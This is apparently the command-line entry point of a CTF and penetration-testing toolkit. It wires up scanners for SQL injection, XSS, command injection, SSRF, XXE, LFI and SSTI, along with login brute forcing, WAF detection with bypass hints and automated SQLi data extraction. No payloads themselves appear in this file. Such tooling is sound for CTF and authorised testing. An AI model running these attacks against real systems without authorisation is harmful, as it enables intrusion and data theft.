"""CTF Toolkit CLI - Main entry point."""

import asyncio
import sys
from pathlib import Path
from typing import Optional

import click
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

from . import __version__
from .core.context import AttackContext
from .core.http_client import HttpClient
from .attacks.sqli import SqliScanner, get_payloads, substitute_placeholders
from .attacks.xss import XssScanner
from .attacks.cmdi import CmdiScanner
from .attacks.ssrf import SsrfScanner
from .attacks.xxe import XxeScanner
from .attacks.lfi import LfiScanner
from .attacks.ssti import SstiScanner
from .attacks.bruteforce import BruteforceScanner
from .attacks.smart_scanner import SmartScanner
from .recon import Fingerprinter, WafDetector
from .utils.encoder import Encoder
from .utils.payload_loader import PayloadLoader, QUICK_SQLI_PAYLOADS
from .utils.flag_extractor import FlagExtractor
from .utils.reporter import Reporter
from .utils.logger import (
    console, log_info, log_success, log_error, log_warning,
    log_flag, print_banner, print_section
)
from .cheatsheets import (
    SQLI_CHEATSHEET, XSS_CHEATSHEET, CMDI_CHEATSHEET,
    SSRF_CHEATSHEET, XXE_CHEATSHEET, LFI_CHEATSHEET, SSTI_CHEATSHEET
)
from .guides import (
    get_guide, get_checklist, get_detection_patterns, get_techniques,
    get_waf_bypass, get_ctf_tips, get_quick_reference, list_all_guides,
    get_available_guides, resolve_attack_type
)
from .guides.renderer import (
    render_overview_list, render_guide_overview, render_technique,
    render_techniques, render_checklist, render_detection_patterns,
    render_waf_bypass, render_ctf_tips, render_quick_reference,
    render_interactive_checklist, export_checklist_markdown
)


# Global options stored in context
class Config:
    def __init__(self):
        self.proxy: Optional[str] = None
        self.cookie: Optional[str] = None
        self.headers: dict[str, str] = {}
        self.timeout: int = 10
        self.rate_limit: float = 10.0
        self.threads: int = 5
        self.output: Optional[str] = None
        self.output_format: str = "json"
        self.verbose: bool = False


pass_config = click.make_pass_decorator(Config, ensure=True)


@click.group()
@click.option("--proxy", "-p", help="Proxy URL (e.g., http://127.0.0.1:8080)")
@click.option("--cookie", "-c", help="Cookie string")
@click.option("--header", "-H", multiple=True, help="Custom header (Name: Value)")
@click.option("--timeout", "-t", default=10, help="Request timeout in seconds")
@click.option("--rate-limit", "-r", default=10.0, help="Requests per second")
@click.option("--threads", default=5, help="Number of concurrent threads")
@click.option("--output", "-o", help="Output file path")
@click.option("--output-format", "-f", type=click.Choice(["json", "txt"]), default="json")
@click.option("--verbose", "-v", is_flag=True, help="Verbose output")
@click.version_option(version=__version__)
@click.pass_context
def cli(ctx, proxy, cookie, header, timeout, rate_limit, threads, output, output_format, verbose):
    """
    CTF Toolkit - CTF/Pentest Automation Tool

    A CLI tool for CTF challenges and penetration testing.
    """
    ctx.ensure_object(Config)
    config = ctx.obj
    config.proxy = proxy
    config.cookie = cookie
    config.timeout = timeout
    config.rate_limit = rate_limit
    config.threads = threads
    config.output = output
    config.output_format = output_format
    config.verbose = verbose

    # Parse headers
    for h in header:
        if ":" in h:
            name, value = h.split(":", 1)
            config.headers[name.strip()] = value.strip()


def create_context(config: Config, url: str, method: str = "GET", param: Optional[str] = None) -> AttackContext:
    """Create AttackContext from CLI config."""
    ctx = AttackContext(
        target_url=url,
        method=method,
        inject_param=param,
        proxy=config.proxy,
        timeout=config.timeout,
        rate_limit=config.rate_limit,
        threads=config.threads,
        verbose=config.verbose,
        headers=config.headers,
    )

    if config.cookie:
        ctx.parse_cookies_string(config.cookie)

    return ctx


# ==================== SQLI Commands ====================

@cli.group()
def sqli():
    """SQL Injection attacks."""
    pass


@sqli.command("scan")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data (key=value&key2=value2)")
@click.option("--payloads", "-P", type=click.Path(exists=True), help="Custom payload file")
@click.option("--db-type", type=click.Choice(["generic", "mysql", "mssql", "oracle", "postgresql", "sqlite"]), default="generic")
@click.option("--success-pattern", help="Pattern indicating successful injection")
@click.option("--time-threshold", default=3.0, help="Time threshold for time-based detection")
@pass_config
def sqli_scan(config, url, param, method, data, payloads, db_type, success_pattern, time_threshold):
    """Scan URL for SQL injection vulnerabilities."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"Method: {method}")
    log_info(f"Database type: {db_type}")

    # Create context
    ctx = create_context(config, url, method, param)
    ctx.time_threshold = time_threshold

    if success_pattern:
        ctx.success_pattern = success_pattern

    if data:
        ctx.parse_data_string(data)

    # Load payloads
    if payloads:
        payload_list = PayloadLoader.from_file(payloads)
        log_info(f"Loaded {len(payload_list)} payloads from file")
    else:
        payload_list = get_payloads(db_type=db_type, attack_type="basic")
        payload_list.extend(get_payloads(db_type=db_type, attack_type="error_based"))
        payload_list.extend(get_payloads(db_type=db_type, attack_type="boolean_blind"))
        log_info(f"Using {len(payload_list)} built-in payloads")

    # Run scan
    scanner = SqliScanner(ctx, db_type=db_type)

    def on_finding(finding):
        log_success(f"[VULNERABLE] {finding['detection_method']}: {finding['payload'][:50]}...")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.scan(payloads=payload_list, on_finding=on_finding))

    # Print summary
    print_section("SCAN RESULTS")

    if results:
        console.print(f"[green]Found {len(results)} vulnerability/vulnerabilities![/green]\n")

        table = Table(title="Vulnerabilities")
        table.add_column("Type", style="red")
        table.add_column("Payload", style="yellow")
        table.add_column("Evidence", style="cyan")
        table.add_column("Confidence")

        for r in results:
            table.add_row(
                r["type"],
                r["payload"][:40] + "..." if len(r["payload"]) > 40 else r["payload"],
                r["evidence"][:50] + "..." if len(r["evidence"]) > 50 else r["evidence"],
                r["confidence"]
            )

        console.print(table)
    else:
        console.print("[yellow]No vulnerabilities found[/yellow]")

    # Save results if output specified
    if config.output:
        reporter = Reporter()
        filepath = reporter.save_report(
            target_url=url,
            scan_type="SQL Injection",
            vulnerabilities=results,
            extracted_data=ctx.extracted_data,
            flags=ctx.flags_found,
            output_format=config.output_format,
            filename=config.output,
        )
        log_success(f"Report saved to: {filepath}")


@sqli.command("bruteforce")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data")
@click.option("--payloads", "-P", required=True, help="Payload file or comma/newline separated string")
@click.option("--substitute", "-s", help="Substitutions (DB=test,TABLE=users)")
@click.option("--success-pattern", help="Pattern for successful injection")
@click.option("--failure-pattern", help="Pattern for failed injection")
@pass_config
def sqli_bruteforce(config, url, param, method, data, payloads, substitute, success_pattern, failure_pattern):
    """Bruteforce with custom payload list."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")

    # Create context
    ctx = create_context(config, url, method, param)

    if success_pattern:
        ctx.success_pattern = success_pattern
    if failure_pattern:
        ctx.failure_pattern = failure_pattern
    if data:
        ctx.parse_data_string(data)

    # Load payloads
    if Path(payloads).exists():
        payload_list = PayloadLoader.from_file(payloads)
    else:
        payload_list = PayloadLoader.from_string(payloads)

    log_info(f"Loaded {len(payload_list)} payloads")

    # Apply substitutions
    if substitute:
        from .attacks.sqli.substitution import parse_substitution_string
        subs = parse_substitution_string(substitute)
        payload_list = [
            substitute_placeholders(p, **subs)
            for p in payload_list
        ]
        log_info(f"Applied substitutions: {subs}")

    # Run scan
    scanner = SqliScanner(ctx)

    def on_finding(finding):
        log_success(f"[HIT] {finding['payload']}")

    results = asyncio.run(scanner.scan(payloads=payload_list, on_finding=on_finding))

    # Print results
    print_section("RESULTS")
    console.print(f"Tested: {len(payload_list)} payloads")
    console.print(f"Hits: {len(results)}")

    if config.output:
        reporter = Reporter()
        reporter.save_report(
            target_url=url,
            scan_type="SQLi Bruteforce",
            vulnerabilities=results,
            extracted_data=[],
            flags=ctx.flags_found,
            output_format=config.output_format,
            filename=config.output,
        )


# ==================== XSS Commands ====================

@cli.group()
def xss():
    """XSS (Cross-Site Scripting) attacks."""
    pass


@xss.command("scan")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data")
@click.option("--payloads", "-P", type=click.Path(exists=True), help="Custom payload file")
@click.option("--xss-type", type=click.Choice(["reflected", "stored", "dom"]), default="reflected")
@pass_config
def xss_scan(config, url, param, method, data, payloads, xss_type):
    """Scan URL for XSS vulnerabilities."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"XSS Type: {xss_type}")

    ctx = create_context(config, url, method, param)
    if data:
        ctx.parse_data_string(data)

    if payloads:
        payload_list = PayloadLoader.from_file(payloads)
        log_info(f"Loaded {len(payload_list)} payloads from file")
    else:
        payload_list = None

    scanner = XssScanner(ctx, xss_type=xss_type)

    def on_finding(finding):
        log_success(f"[VULNERABLE] {finding['payload'][:50]}...")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.scan(payloads=payload_list, on_finding=on_finding))

    print_section("SCAN RESULTS")
    _print_scan_results(results, config, url, "XSS", ctx)


# ==================== Command Injection Commands ====================

@cli.group()
def cmdi():
    """Command Injection attacks."""
    pass


@cmdi.command("scan")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data")
@click.option("--payloads", "-P", type=click.Path(exists=True), help="Custom payload file")
@click.option("--os-type", type=click.Choice(["linux", "windows", "auto"]), default="linux")
@click.option("--time-based/--no-time-based", default=True, help="Include time-based detection")
@pass_config
def cmdi_scan(config, url, param, method, data, payloads, os_type, time_based):
    """Scan URL for Command Injection vulnerabilities."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"OS Type: {os_type}")

    ctx = create_context(config, url, method, param)
    if data:
        ctx.parse_data_string(data)

    if payloads:
        payload_list = PayloadLoader.from_file(payloads)
        log_info(f"Loaded {len(payload_list)} payloads from file")
    else:
        payload_list = None

    scanner = CmdiScanner(ctx, os_type=os_type)

    def on_finding(finding):
        log_success(f"[VULNERABLE] {finding['detection_method']}: {finding['payload'][:50]}...")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.scan(payloads=payload_list, on_finding=on_finding, time_based=time_based))

    print_section("SCAN RESULTS")
    _print_scan_results(results, config, url, "Command Injection", ctx)


# ==================== SSRF Commands ====================

@cli.group()
def ssrf():
    """SSRF (Server-Side Request Forgery) attacks."""
    pass


@ssrf.command("scan")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data")
@click.option("--payloads", "-P", type=click.Path(exists=True), help="Custom payload file")
@click.option("--cloud", type=click.Choice(["auto", "aws", "gcp", "azure"]), default="auto")
@click.option("--scan-cloud/--no-scan-cloud", default=True, help="Scan cloud metadata endpoints")
@click.option("--scan-internal/--no-scan-internal", default=True, help="Scan internal services")
@pass_config
def ssrf_scan(config, url, param, method, data, payloads, cloud, scan_cloud, scan_internal):
    """Scan URL for SSRF vulnerabilities."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"Cloud Provider: {cloud}")

    ctx = create_context(config, url, method, param)
    if data:
        ctx.parse_data_string(data)

    if payloads:
        payload_list = PayloadLoader.from_file(payloads)
        log_info(f"Loaded {len(payload_list)} payloads from file")
    else:
        payload_list = None

    scanner = SsrfScanner(ctx, cloud_provider=cloud)

    def on_finding(finding):
        log_success(f"[VULNERABLE] {finding['ssrf_type']}: {finding['payload'][:50]}...")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.scan(
        payloads=payload_list,
        on_finding=on_finding,
        scan_cloud=scan_cloud,
        scan_internal=scan_internal
    ))

    print_section("SCAN RESULTS")
    _print_scan_results(results, config, url, "SSRF", ctx)


# ==================== XXE Commands ====================

@cli.group()
def xxe():
    """XXE (XML External Entity) attacks."""
    pass


@xxe.command("scan")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", help="Parameter to inject (optional for POST body)")
@click.option("--method", "-m", default="POST", type=click.Choice(["GET", "POST"]))
@click.option("--payloads", "-P", type=click.Path(exists=True), help="Custom payload file")
@click.option("--callback-url", help="Callback URL for blind XXE detection")
@click.option("--include-ssrf/--no-include-ssrf", default=True, help="Include SSRF via XXE")
@pass_config
def xxe_scan(config, url, param, method, payloads, callback_url, include_ssrf):
    """Scan URL for XXE vulnerabilities."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Method: {method}")

    ctx = create_context(config, url, method, param)

    if payloads:
        payload_list = PayloadLoader.from_file(payloads)
        log_info(f"Loaded {len(payload_list)} payloads from file")
    else:
        payload_list = None

    scanner = XxeScanner(ctx, callback_url=callback_url)

    def on_finding(finding):
        log_success(f"[VULNERABLE] {finding['xxe_type']}: {finding['evidence'][:50]}...")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.scan(
        payloads=payload_list,
        on_finding=on_finding,
        include_ssrf=include_ssrf
    ))

    print_section("SCAN RESULTS")
    _print_scan_results(results, config, url, "XXE", ctx)


# ==================== LFI Commands ====================

@cli.group()
def lfi():
    """LFI (Local File Inclusion) attacks."""
    pass


@lfi.command("scan")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data")
@click.option("--payloads", "-P", type=click.Path(exists=True), help="Custom payload file")
@click.option("--os-type", type=click.Choice(["linux", "windows", "auto"]), default="linux")
@click.option("--php-wrappers/--no-php-wrappers", default=True, help="Include PHP wrapper payloads")
@click.option("--encoding-bypass/--no-encoding-bypass", default=True, help="Include encoding bypass")
@pass_config
def lfi_scan(config, url, param, method, data, payloads, os_type, php_wrappers, encoding_bypass):
    """Scan URL for LFI vulnerabilities."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"OS Type: {os_type}")

    ctx = create_context(config, url, method, param)
    if data:
        ctx.parse_data_string(data)

    if payloads:
        payload_list = PayloadLoader.from_file(payloads)
        log_info(f"Loaded {len(payload_list)} payloads from file")
    else:
        payload_list = None

    scanner = LfiScanner(ctx, os_type=os_type)

    def on_finding(finding):
        log_success(f"[VULNERABLE] {finding['lfi_type']}: {finding['payload'][:50]}...")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.scan(
        payloads=payload_list,
        on_finding=on_finding,
        include_php_wrappers=php_wrappers,
        include_encoding_bypass=encoding_bypass
    ))

    print_section("SCAN RESULTS")
    _print_scan_results(results, config, url, "LFI", ctx)


# ==================== SSTI Commands ====================

@cli.group()
def ssti():
    """SSTI (Server-Side Template Injection) attacks."""
    pass


@ssti.command("scan")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data")
@click.option("--payloads", "-P", type=click.Path(exists=True), help="Custom payload file")
@click.option("--engine", type=click.Choice(["auto", "jinja2", "twig", "freemarker", "velocity", "thymeleaf", "mako", "erb", "nunjucks"]), default="auto")
@click.option("--detect-only", is_flag=True, help="Only detect SSTI, don't attempt exploitation")
@pass_config
def ssti_scan(config, url, param, method, data, payloads, engine, detect_only):
    """Scan URL for SSTI vulnerabilities."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"Template Engine: {engine}")

    ctx = create_context(config, url, method, param)
    if data:
        ctx.parse_data_string(data)

    if payloads:
        payload_list = PayloadLoader.from_file(payloads)
        log_info(f"Loaded {len(payload_list)} payloads from file")
    else:
        payload_list = None

    scanner = SstiScanner(ctx, engine=engine)

    def on_finding(finding):
        log_success(f"[VULNERABLE] {finding['template_engine']}: {finding['payload'][:50]}...")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.scan(
        payloads=payload_list,
        on_finding=on_finding,
        detect_only=detect_only
    ))

    print_section("SCAN RESULTS")
    _print_scan_results(results, config, url, "SSTI", ctx)


# ==================== Brute Force Commands ====================

@cli.group()
def bruteforce():
    """Brute Force attacks (directory enum, login, parameter fuzzing)."""
    pass


@bruteforce.command("dir")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--wordlist", "-w", type=click.Path(exists=True), help="Custom wordlist file")
@click.option("--extensions", "-x", help="File extensions (comma-separated, e.g., php,txt,html)")
@click.option("--filter-status", "-fs", help="Status codes to filter out (comma-separated, e.g., 404,403)")
@click.option("--filter-length", "-fl", type=int, help="Response length to filter out")
@pass_config
def bruteforce_dir(config, url, wordlist, extensions, filter_status, filter_length):
    """Enumerate directories and files."""
    print_banner()
    log_info(f"Target: {url}")

    ctx = create_context(config, url, "GET", None)

    # Load wordlist
    if wordlist:
        word_list = PayloadLoader.from_file(wordlist)
        log_info(f"Loaded {len(word_list)} words from file")
    else:
        word_list = None
        log_info("Using built-in directory wordlist")

    # Parse extensions
    ext_list = None
    if extensions:
        ext_list = ["." + e.strip().lstrip(".") for e in extensions.split(",")]
        ext_list.append("")  # Also try without extension
        log_info(f"Extensions: {ext_list}")

    # Parse filter status
    status_filter = [404]
    if filter_status:
        status_filter = [int(s.strip()) for s in filter_status.split(",")]
        log_info(f"Filtering status codes: {status_filter}")

    scanner = BruteforceScanner(ctx)

    def on_finding(finding):
        status = finding.get("status", "")
        length = finding.get("length", 0)
        log_success(f"[{status}] {finding['path']} (length: {length})")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.enumerate_directories(
        wordlist=word_list,
        extensions=ext_list,
        on_finding=on_finding,
        filter_status=status_filter,
        filter_length=filter_length,
    ))

    print_section("SCAN RESULTS")
    _print_bruteforce_results(results, config, url, "directory", ctx)


@bruteforce.command("login")
@click.option("--url", "-u", required=True, help="Target login URL")
@click.option("--usernames", "-U", type=click.Path(exists=True), help="Username wordlist file")
@click.option("--passwords", "-P", type=click.Path(exists=True), help="Password wordlist file")
@click.option("--username", help="Single username to test")
@click.option("--user-field", default="username", help="Username form field name")
@click.option("--pass-field", default="password", help="Password form field name")
@click.option("--success", help="String indicating successful login")
@click.option("--failure", help="String indicating failed login")
@pass_config
def bruteforce_login(config, url, usernames, passwords, username, user_field, pass_field, success, failure):
    """Brute force login form."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Username field: {user_field}")
    log_info(f"Password field: {pass_field}")

    ctx = create_context(config, url, "POST", None)

    # Load usernames
    if username:
        user_list = [username]
        log_info(f"Testing single username: {username}")
    elif usernames:
        user_list = PayloadLoader.from_file(usernames)
        log_info(f"Loaded {len(user_list)} usernames from file")
    else:
        user_list = None
        log_info("Using built-in username list")

    # Load passwords
    if passwords:
        pass_list = PayloadLoader.from_file(passwords)
        log_info(f"Loaded {len(pass_list)} passwords from file")
    else:
        pass_list = None
        log_info("Using built-in password list")

    scanner = BruteforceScanner(ctx)

    def on_finding(finding):
        log_success(f"[VALID] {finding['username']}:{finding['password']}")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.bruteforce_login(
        usernames=user_list,
        passwords=pass_list,
        username_field=user_field,
        password_field=pass_field,
        success_indicator=success,
        failure_indicator=failure,
        on_finding=on_finding,
    ))

    print_section("SCAN RESULTS")
    _print_bruteforce_results(results, config, url, "login", ctx)


@bruteforce.command("fuzz")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--wordlist", "-w", type=click.Path(exists=True), help="Parameter wordlist file")
@click.option("--value", "-v", default="ctf_test", help="Test value for parameters")
@pass_config
def bruteforce_fuzz(config, url, wordlist, value):
    """Fuzz for hidden parameters."""
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Test value: {value}")

    ctx = create_context(config, url, "GET", None)

    # Load wordlist
    if wordlist:
        param_list = PayloadLoader.from_file(wordlist)
        log_info(f"Loaded {len(param_list)} parameters from file")
    else:
        param_list = None
        log_info("Using built-in parameter list")

    scanner = BruteforceScanner(ctx)

    def on_finding(finding):
        param = finding.get("parameter", "")
        diff = finding.get("length_diff", 0)
        note = finding.get("note", "")
        if note:
            log_success(f"[FOUND] ?{param}= ({note})")
        else:
            log_success(f"[FOUND] ?{param}= (length diff: {diff})")
        if finding.get("flags_found"):
            for flag in finding["flags_found"]:
                log_flag(flag)

    results = asyncio.run(scanner.fuzz_parameters(
        parameters=param_list,
        test_value=value,
        on_finding=on_finding,
    ))

    print_section("SCAN RESULTS")
    _print_bruteforce_results(results, config, url, "parameter", ctx)


def _print_bruteforce_results(results: list, config: Config, url: str, scan_type: str, ctx: AttackContext):
    """Print brute force results."""
    if results:
        console.print(f"[green]Found {len(results)} result(s)![/green]\n")

        table = Table(title=f"Brute Force Results ({scan_type})")

        if scan_type == "directory":
            table.add_column("Status", style="cyan")
            table.add_column("Path", style="yellow")
            table.add_column("Length", style="white")
            table.add_column("Content-Type", style="dim")

            for r in results:
                table.add_row(
                    str(r.get("status", "")),
                    r.get("path", ""),
                    str(r.get("length", "")),
                    r.get("content_type", "")[:30],
                )

        elif scan_type == "login":
            table.add_column("Username", style="cyan")
            table.add_column("Password", style="yellow")
            table.add_column("Status", style="white")

            for r in results:
                table.add_row(
                    r.get("username", ""),
                    r.get("password", ""),
                    str(r.get("status", "")),
                )

        elif scan_type == "parameter":
            table.add_column("Parameter", style="cyan")
            table.add_column("Type", style="yellow")
            table.add_column("Length Diff", style="white")

            for r in results:
                table.add_row(
                    r.get("parameter", ""),
                    r.get("type", ""),
                    str(r.get("length_diff", r.get("note", ""))),
                )

        console.print(table)
    else:
        console.print("[yellow]No results found[/yellow]")

    # Save results if output specified
    if config.output:
        reporter = Reporter()
        filepath = reporter.save_report(
            target_url=url,
            scan_type=f"bruteforce_{scan_type}",
            vulnerabilities=results,
            extracted_data=ctx.extracted_data,
            flags=ctx.flags_found,
            output_format=config.output_format,
            filename=config.output,
        )
        log_success(f"Report saved to: {filepath}")


# ==================== Helper Functions ====================

def _print_scan_results(results: list, config: Config, url: str, scan_type: str, ctx: AttackContext):
    """Print scan results in a table format."""
    if results:
        console.print(f"[green]Found {len(results)} vulnerability/vulnerabilities![/green]\n")

        table = Table(title="Vulnerabilities")
        table.add_column("Type", style="red")
        table.add_column("Payload", style="yellow")
        
        # XSS 결과에는 반영 위치 컬럼 추가
        if scan_type == "XSS":
            table.add_column("Location", style="magenta")
        
        table.add_column("Evidence", style="cyan")
        table.add_column("Confidence")

        for r in results:
            payload_display = r["payload"][:40] + "..." if len(r["payload"]) > 40 else r["payload"]
            evidence_display = r["evidence"][:50] + "..." if len(r["evidence"]) > 50 else r["evidence"]
            
            if scan_type == "XSS":
                location = r.get("reflection_location", "Unknown")
                table.add_row(
                    r["type"],
                    payload_display,
                    location,
                    evidence_display,
                    r["confidence"]
                )
            else:
                table.add_row(
                    r["type"],
                    payload_display,
                    evidence_display,
                    r["confidence"]
                )

        console.print(table)
    else:
        console.print("[yellow]No vulnerabilities found[/yellow]")

    # Save results if output specified
    if config.output:
        reporter = Reporter()
        filepath = reporter.save_report(
            target_url=url,
            scan_type=scan_type,
            vulnerabilities=results,
            extracted_data=ctx.extracted_data,
            flags=ctx.flags_found,
            output_format=config.output_format,
            filename=config.output,
        )
        log_success(f"Report saved to: {filepath}")


# ==================== Recon Commands ====================

@cli.group()
def recon():
    """Target reconnaissance and fingerprinting."""
    pass


@recon.command("fingerprint")
@click.option("--url", "-u", required=True, help="Target URL")
@pass_config
def recon_fingerprint(config, url):
    """Detect target architecture (server, OS, DB)."""
    print_banner()
    log_info(f"Fingerprinting: {url}")

    ctx = create_context(config, url)
    fingerprinter = Fingerprinter(ctx)

    fp = fingerprinter.fingerprint_sync()
    fingerprinter.print_results()


@recon.command("headers")
@click.option("--url", "-u", required=True, help="Target URL")
@pass_config
def recon_headers(config, url):
    """Analyze response headers."""
    print_banner()
    log_info(f"Fetching headers from: {url}")

    ctx = create_context(config, url)
    client = HttpClient(ctx)

    response = client.request_sync()

    print_section("RESPONSE HEADERS")

    table = Table()
    table.add_column("Header", style="cyan")
    table.add_column("Value", style="yellow")

    for name, value in response.headers.items():
        table.add_row(name, value)

    console.print(table)
    console.print(f"\n[cyan]Status Code:[/cyan] {response.status_code}")
    console.print(f"[cyan]Content Length:[/cyan] {response.content_length}")
    console.print(f"[cyan]Response Time:[/cyan] {response.elapsed:.3f}s")

    client.close_sync()


@recon.command("waf")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--probe/--no-probe", default=True, help="Send attack probes to trigger WAF")
@pass_config
def recon_waf(config, url, probe):
    """Detect WAF (Web Application Firewall)."""
    print_banner()
    log_info(f"Detecting WAF on: {url}")

    ctx = create_context(config, url)
    detector = WafDetector(ctx)

    result = asyncio.run(detector.detect(probe=probe))

    print_section("WAF DETECTION RESULTS")

    if result.detected:
        console.print(f"[red]WAF Detected![/red]")
        console.print(f"[cyan]Type:[/cyan] {result.waf_name}")
        console.print(f"[cyan]Confidence:[/cyan] {result.confidence:.0%}")

        if result.evidence:
            console.print("\n[bold]Evidence:[/bold]")
            for ev in result.evidence:
                console.print(f"  - {ev}")

        if result.bypass_suggestions:
            console.print("\n[bold]Bypass Suggestions:[/bold]")
            for sug in result.bypass_suggestions[:5]:
                console.print(f"  - {sug}")
    else:
        console.print("[green]No WAF detected[/green]")


# ==================== Smart Scan Commands ====================

@cli.command("smart")
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--param", "-p", required=True, help="Parameter to inject")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST"]))
@click.option("--data", "-d", help="POST data")
@click.option("--type", "-T", "scan_types", multiple=True, help="Vulnerability types (sqli, xss, cmdi, lfi, ssti)")
@click.option("--aggressive", "-a", is_flag=True, help="Aggressive mode (more payloads)")
@click.option("--skip-waf", is_flag=True, help="Skip WAF detection")
@pass_config
def smart_scan(config, url, param, method, data, scan_types, aggressive, skip_waf):
    """Smart vulnerability scan with automatic detection.

    Performs intelligent 4-phase scanning:

    1. Recon: WAF detection, baseline learning, context analysis

    2. Detection: Test minimal payloads for each vulnerability type

    3. Verification: Confirm detected vulnerabilities

    4. Extraction: Extract data from confirmed SQLi

    Examples:

        ctf-toolkit smart -u "http://target/?id=1" -p id

        ctf-toolkit smart -u "http://target/?id=1" -p id -T sqli -T xss

        ctf-toolkit smart -u "http://target/?id=1" -p id --aggressive
    """
    print_banner()
    log_info(f"Target: {url}")
    log_info(f"Parameter: {param}")
    log_info(f"Mode: {'Aggressive' if aggressive else 'Normal'}")

    ctx = create_context(config, url, method, param)
    if data:
        ctx.parse_data_string(data)

    scanner = SmartScanner(ctx, aggressive=aggressive, skip_waf_detection=skip_waf)

    # Convert scan_types tuple to list
    types_list = list(scan_types) if scan_types else None

    def on_finding(finding):
        log_success(f"[{finding.vuln_type.value}] {finding.payload[:50]}...")

    def on_phase(phase):
        log_info(f"Entering phase: {phase.value}")

    result = asyncio.run(scanner.smart_scan(
        scan_types=types_list,
        on_finding=on_finding,
        on_phase=on_phase,
    ))

    # Print results
    print_section("SMART SCAN RESULTS")

    console.print(f"[cyan]Requests Made:[/cyan] {result.requests_made}")
    console.print(f"[cyan]Phase Completed:[/cyan] {result.phase_completed.value}")

    if result.recon.waf_detected:
        console.print(f"[yellow]WAF Detected:[/yellow] {result.recon.waf_name}")

    if result.vulnerabilities:
        console.print(f"\n[green]Found {len(result.vulnerabilities)} vulnerabilities![/green]\n")

        table = Table(title="Vulnerabilities")
        table.add_column("Type", style="red")
        table.add_column("Payload", style="yellow")
        table.add_column("Confidence", style="cyan")
        table.add_column("Verified")
        table.add_column("Extracted Data")

        for v in result.vulnerabilities:
            verified = "[green]Yes[/green]" if v.verified else "[yellow]No[/yellow]"
            table.add_row(
                v.vuln_type.value,
                v.payload[:40] + "..." if len(v.payload) > 40 else v.payload,
                f"{v.confidence:.0%}",
                verified,
                (v.extracted_data[:30] + "...") if v.extracted_data else "-",
            )

        console.print(table)
    else:
        console.print("[yellow]No vulnerabilities found[/yellow]")

    # Save results if output specified
    if config.output:
        reporter = Reporter()
        vuln_list = [
            {
                "type": v.vuln_type.value,
                "parameter": v.parameter,
                "payload": v.payload,
                "evidence": v.evidence,
                "confidence": v.confidence,
                "verified": v.verified,
                "extracted_data": v.extracted_data,
            }
            for v in result.vulnerabilities
        ]
        filepath = reporter.save_report(
            target_url=url,
            scan_type="Smart Scan",
            vulnerabilities=vuln_list,
            extracted_data=[v.extracted_data for v in result.vulnerabilities if v.extracted_data],
            flags=ctx.flags_found,
            output_format=config.output_format,
            filename=config.output,
        )
        log_success(f"Report saved to: {filepath}")


# ==================== Encode Commands ====================

@cli.group()
def encode():
    """Encoding/decoding utilities."""
    pass


@encode.command("base64")
@click.option("--input", "-i", "input_text", required=True, help="Input string")
@click.option("--decode", "-d", is_flag=True, help="Decode instead of encode")
def encode_base64(input_text, decode):
    """Base64 encode/decode."""
    if decode:
        result = Encoder.base64_decode(input_text)
    else:
        result = Encoder.base64_encode(input_text)
    console.print(result)


@encode.command("url")
@click.option("--input", "-i", "input_text", required=True, help="Input string")
@click.option("--decode", "-d", is_flag=True, help="Decode instead of encode")
@click.option("--double", is_flag=True, help="Double URL encode")
